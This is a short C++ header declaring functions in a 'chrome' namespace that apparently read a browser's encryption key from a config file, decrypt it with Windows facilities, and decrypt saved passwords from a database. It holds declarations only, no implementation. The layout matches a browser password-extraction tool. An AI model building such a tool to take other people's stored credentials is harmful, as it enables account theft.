#pragma once
#include <map>
#include <string>
#include <vector>
namespace chrome
{
	void get_pairs_b80(std::multimap<std::string, std::string>& ret, std::string db_path, std::vector<uint8_t>& key);
	std::vector<uint8_t> get_key(std::string config_file_path);
	std::vector<uint8_t> base64_decode(std::string data);
	std::vector<uint8_t> win_decrypt(std::vector<uint8_t>& data);
	std::string password_decrypt(std::vector<uint8_t>& data, std::vector<uint8_t>& key);
}
